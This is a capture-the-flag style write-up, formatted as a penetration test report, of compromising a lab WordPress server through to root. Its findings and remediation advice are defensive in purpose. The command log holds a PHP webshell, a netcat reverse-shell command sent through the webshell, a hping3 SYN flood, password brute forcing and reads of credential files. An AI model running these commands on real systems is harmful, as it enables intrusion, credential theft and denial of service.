---
layout: writeup
name: "hackme"
platform: "HackSmarter"
category: "hacksmarter"
difficulty: "Easy"
permalink: /writeups/hacksmarter/hackme/
os: "Linux"
date: 2026-02-25
pwned: true
---
# Tafe hackme 
**Difficulty:** Easy 
**OS:** Linux 
## Summary
WPScan user enum → rockyou bruteforce → wp-admin access → PHP webshell upload → Netcat reverse shell → www-data → credential reuse → hackme (GID 0) → mysql_history plaintext creds → su root → uid=0

## HackMe Lab – Penetration Test Report

**Author:** Tate Pannam  
**Date:** 25 February 2026  
**Environment:** Azure Lab (Controlled Environment)  
**Target:** WordPress (10.10.10.2)  
**Assessment Type:** Internal Network Penetration Test

---

## Executive Summary

A controlled penetration test was conducted against a WordPress-based web server within a lab environment.

The assessment identified multiple critical vulnerabilities that allowed:

- WordPress user enumeration
    
- Successful brute-force authentication
    
- Arbitrary PHP file upload
    
- Remote Code Execution (RCE)
    
- Credential reuse exploitation
    
- Local privilege escalation
    
- Full root compromise
    

The attack chain required no advanced exploits and relied primarily on weak passwords, poor privilege separation, and insecure credential storage.

**Overall Risk Rating: 🔴 Critical**

---

## Scope

|System|IP Address|Role|
|---|---|---|
|WordPress Server|10.10.10.2|Web Application|
|Windows 2016|10.10.10.1|AD / FTP / IIS|
|Kali Linux|10.10.10.9|Attacker|

---

## 🔍 Methodology

Testing followed standard penetration testing phases:

1. Reconnaissance
    
2. Enumeration
    
3. Vulnerability Identification
    
4. Exploitation
    
5. Post-Exploitation
    
6. Privilege Escalation
    
7. Impact Assessment
    

**Tools Used:**

- Nmap
    
- Netdiscover
    
- WPScan
    
- hping3
    
- Netcat
    
- Wireshark
    
- Manual Linux enumeration
    

---

# 🔎 Findings

---

##  WordPress User Enumeration

**Severity:** Medium

WPScan successfully identified valid WordPress usernames.

This enabled targeted brute-force attacks.

**Impact:** Reduces attack complexity.

**Recommendation:**

- Disable user enumeration
    
- Enable rate limiting
    
- Deploy MFA
    

---

##  Weak Password & Brute Force Authentication

**Severity:** 🔴 Critical

Using WPScan with the rockyou wordlist, valid credentials were discovered:

Username: user22  
Password: awesome!

**Impact:** Administrative access to WordPress backend.

**Recommendation:**

- Enforce strong password policy
    
- Implement MFA
    
- Enable login attempt throttling
    

---

## Arbitrary File Upload → Remote Code Execution

**Severity:** 🔴 Critical

Administrative access allowed upload of a PHP webshell:

<?php system($_REQUEST['cmd']); ?>

Execution confirmed:

uid=33(www-data)

**Impact:** Remote Code Execution (RCE) as web server user.

**Recommendation:**

- Disable file manager plugins
    
- Restrict PHP execution in wp-content
    
- Apply least privilege to web server
    

---

##  Credential Reuse (Web → System)

**Severity:** High

The WordPress password `awesome!` was reused for a local Linux account:

hackme

Successful authentication confirmed lateral movement.

**Impact:** Web compromise escalated to system-level access.

**Recommendation:**

- Enforce unique credentials per service
    
- Deploy centralized identity management
    
- Implement MFA
    

---

##  Misconfigured User with Root Group Membership

**Severity:** 🔴 Critical

The `hackme` user had:

gid=0(root)

Improper group assignment allowed privilege escalation.

**Impact:** Elevated system privileges.

**Recommendation:**

- Audit all user/group memberships
    
- Remove unnecessary root associations
    

---

##  Plaintext Credentials in .mysql_history

**Severity:** 🔴 Critical

Database credentials were discovered in:

/root/.mysql_history

Root password recovered:

toor

Escalation confirmed:

uid=0(root)

**Impact:** Full system compromise.

**Recommendation:**

- Disable history logging for privileged users
    
- Clear sensitive history files
    
- Use secure secret storage mechanisms
    

---

# Attack Chain Overview

User Enumeration  
      ↓  
Password Brute Force  
      ↓  
Admin Login  
      ↓  
PHP File Upload  
      ↓  
Webshell Execution  
      ↓  
Reverse Shell  
      ↓  
Credential Reuse  
      ↓  
Privilege Escalation  
      ↓  
Root Access

This demonstrates full compromise of:

- Confidentiality
    
- Integrity
    
- Availability
    

---
# Command log
# -----------------------------
# Initial Network Reconfiguration
# -----------------------------
`ip a`
`sudo ip addr del 192.168.0.2/24 dev eth0`
`sudo ip addr add 10.10.10.9/8 dev eth0`
`sudo ip link set eth0 up`
`ping 10.10.10.1`
# -----------------------------
# Reconnaissance
# -----------------------------
`nmap -sn 10.10.10.0/24`
`netdiscover -r 10.10.10.0/8`
`sudo nmap -sS -sV 10.10.10.1`
`sudo nmap -sU 10.10.10.1`
# -----------------------------
# SYN Flood (hping3)
# -----------------------------
`sudo hping3 -S -p 21 10.10.10.1 --flood`
# -----------------------------
# WPScan Enumeration & Brute Force
# -----------------------------
`wpscan --url http://hackme.vu --enumerate u`
`wpscan --url http://hackme.vu \`
`--username user22 \`
`--passwords /usr/share/wordlists/rockyou.txt`
# -----------------------------
# WordPress Admin Login
# -----------------------------
http://hackme.vu/wp-admin
`Username: user22`
`Password: awesome!`
# -----------------------------
# Webshell Upload (via WP File Manager)
# -----------------------------
Filename:
`MALWARE_TATE_PANNAM.php`
Webshell contents:
`<?php system($_REQUEST['cmd']); ?>`
# -----------------------------
# Webshell Command Execution
# -----------------------------
`http://hackme.vu/wp-content/shell.php?cmd=id`
# -----------------------------
# Reverse Shell
# -----------------------------
# On attacker machine:
`nc -lvnp 4444`
# In browser via webshell:
`http://hackme.vu/wp-content/shell.php?cmd=nc+-e+/bin/sh+10.10.10.9+4444`
# -----------------------------
# Post-Exploitation Enumeration
# -----------------------------
`cat /etc/passwd`
# -----------------------------
# Lateral Movement
# -----------------------------
su hackme
`Password: awesome!`
`id`
# -----------------------------
# Privilege Escalation
# -----------------------------
`cat /root/.mysql_history`
`su -`
`Password: toor`
`id`
`ip a`

# Strategic Remediation Plan

1. Implement Multi-Factor Authentication
    
2. Enforce strong password policies
    
3. Patch and upgrade legacy systems
    
4. Disable unnecessary WordPress plugins
    
5. Harden Linux user permissions
    
6. Remove plaintext credential storage
    
7. Conduct regular penetration testing
    

---

#  Lessons Learned

This assessment highlights how:

- Weak passwords
    
- Credential reuse
    
- Poor privilege configuration
    
- Insecure operational practices
    

Can combine into complete system compromise without advanced exploits.

Security failures rarely occur in isolation — they cascade.

---

# ⚠ Disclaimer

This penetration test was conducted within a controlled lab environment for educational purposes only.

No unauthorized systems were accessed.